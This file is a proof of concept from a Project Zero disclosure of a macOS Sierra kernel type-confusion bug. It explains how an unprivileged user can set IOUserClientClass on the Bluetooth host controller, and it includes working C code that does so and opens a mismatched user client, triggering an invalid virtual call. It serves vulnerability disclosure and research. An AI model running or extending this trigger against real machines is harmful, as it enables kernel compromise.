@@ -1,0 +1,190 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=974
+
+There are two ways for IOServices to define their IOUserClient classes: they can 
+override IOService::newUserClient and allocate the correct type themselves
+or they can set the IOUserClientClass key in their registry entry.
+
+The default implementation of IOService::newUserClient does this:
+
+  IOReturn IOService::newUserClient( task_t owningTask, void * securityID,
+                                    UInt32 type,  OSDictionary * properties,
+                                    IOUserClient ** handler )
+  {
+      const OSSymbol *userClientClass = 0;
+      IOUserClient *client;
+      OSObject *temp;
+      
+      if (kIOReturnSuccess == newUserClient( owningTask, securityID, type, handler ))
+          return kIOReturnSuccess;
+      
+      // First try my own properties for a user client class name
+      temp = getProperty(gIOUserClientClassKey);
+      if (temp) {
+          if (OSDynamicCast(OSSymbol, temp))
+              userClientClass = (const OSSymbol *) temp;
+          else if (OSDynamicCast(OSString, temp)) {
+              userClientClass = OSSymbol::withString((OSString *) temp);
+              if (userClientClass)
+                  setProperty(kIOUserClientClassKey,
+                              (OSObject *) userClientClass);
+          }
+      }
+      
+      // Didn't find one so lets just bomb out now without further ado.
+      if (!userClientClass)
+          return kIOReturnUnsupported;
+      
+      // This reference is consumed by the IOServiceOpen call
+      temp = OSMetaClass::allocClassWithName(userClientClass);
+      if (!temp)
+          return kIOReturnNoMemory;
+      
+      if (OSDynamicCast(IOUserClient, temp))
+          client = (IOUserClient *) temp;
+      else {
+          temp->release();
+          return kIOReturnUnsupported;
+      }
+      
+      if ( !client->initWithTask(owningTask, securityID, type, properties) ) {
+
+  ... continue on and call client->start(this) to connect the client to the service
+
+This reads the "IOUserClientClass" entry in the services registry entry and uses the IOKit
+reflection API to allocate it.
+
+If an IOService doesn't want to have any IOUserClients then it has two options, either override
+newUserClient to return kIOReturnUnsupported or make sure that there is no IOUserClientClass
+entry in the service's registry entry.
+
+AppleBroadcomBluetoothHostController takes the second approach but inherits from IOBluetoothHostController
+which overrides ::setProperties to allow an unprivileged user to set *all* registry entry properties,
+including IOUserClientClass.
+
+This leads to a very exploitable type confusion issue as plenty of IOUserClient subclasses don't expect
+to be connected to a different IOService provider. In this PoC I connect an IGAccelSharedUserClient to
+a AppleBroadcomBluetoothHostController which leads immediately to an invalid virtual call. With more
+investigation I'm sure you could build some very nice exploitation primitives with this bug.
+
+Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
+*/
+
+// ianbeer
+// clang -o wrongclass wrongclass.c -framework IOKit -framework CoreFoundation
+
+#if 0
+MacOS kernel code execution due to writable privileged IOKit registry properties
+
+There are two ways for IOServices to define their IOUserClient classes: they can 
+override IOService::newUserClient and allocate the correct type themselves
+or they can set the IOUserClientClass key in their registry entry.
+
+The default implementation of IOService::newUserClient does this:
+
+  IOReturn IOService::newUserClient( task_t owningTask, void * securityID,
+                                    UInt32 type,  OSDictionary * properties,
+                                    IOUserClient ** handler )
+  {
+      const OSSymbol *userClientClass = 0;
+      IOUserClient *client;
+      OSObject *temp;
+      
+      if (kIOReturnSuccess == newUserClient( owningTask, securityID, type, handler ))
+          return kIOReturnSuccess;
+      
+      // First try my own properties for a user client class name
+      temp = getProperty(gIOUserClientClassKey);
+      if (temp) {
+          if (OSDynamicCast(OSSymbol, temp))
+              userClientClass = (const OSSymbol *) temp;
+          else if (OSDynamicCast(OSString, temp)) {
+              userClientClass = OSSymbol::withString((OSString *) temp);
+              if (userClientClass)
+                  setProperty(kIOUserClientClassKey,
+                              (OSObject *) userClientClass);
+          }
+      }
+      
+      // Didn't find one so lets just bomb out now without further ado.
+      if (!userClientClass)
+          return kIOReturnUnsupported;
+      
+      // This reference is consumed by the IOServiceOpen call
+      temp = OSMetaClass::allocClassWithName(userClientClass);
+      if (!temp)
+          return kIOReturnNoMemory;
+      
+      if (OSDynamicCast(IOUserClient, temp))
+          client = (IOUserClient *) temp;
+      else {
+          temp->release();
+          return kIOReturnUnsupported;
+      }
+      
+      if ( !client->initWithTask(owningTask, securityID, type, properties) ) {
+
+  ... continue on and call client->start(this) to connect the client to the service
+
+This reads the "IOUserClientClass" entry in the services registry entry and uses the IOKit
+reflection API to allocate it.
+
+If an IOService doesn't want to have any IOUserClients then it has two options, either override
+newUserClient to return kIOReturnUnsupported or make sure that there is no IOUserClientClass
+entry in the service's registry entry.
+
+AppleBroadcomBluetoothHostController takes the second approach but inherits from IOBluetoothHostController
+which overrides ::setProperties to allow an unprivileged user to set *all* registry entry properties,
+including IOUserClientClass.
+
+This leads to a very exploitable type confusion issue as plenty of IOUserClient subclasses don't expect
+to be connected to a different IOService provider. In this PoC I connect an IGAccelSharedUserClient to
+a AppleBroadcomBluetoothHostController which leads immediately to an invalid virtual call. With more
+investigation I'm sure you could build some very nice exploitation primitives with this bug.
+
+Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
+
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+
+#include <IOKit/IOKitLib.h>
+#include <CoreFoundation/CoreFoundation.h>
+
+int main(){
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleBroadcomBluetoothHostController"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 1;
+  }
+  printf("got service: %x\n", service);
+
+	// try to set the prop: 
+	kern_return_t err;
+	err = IORegistryEntrySetCFProperty(
+		service,
+		CFSTR("IOUserClientClass"),
+		CFSTR("IGAccelSharedUserClient"));
+	
+	if (err != KERN_SUCCESS){
+		printf("setProperty failed\n");
+	} else {
+		printf("set the property!!\n");
+  }
+
+  // open a userclient:
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 1;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+  
+  return 0;
+}
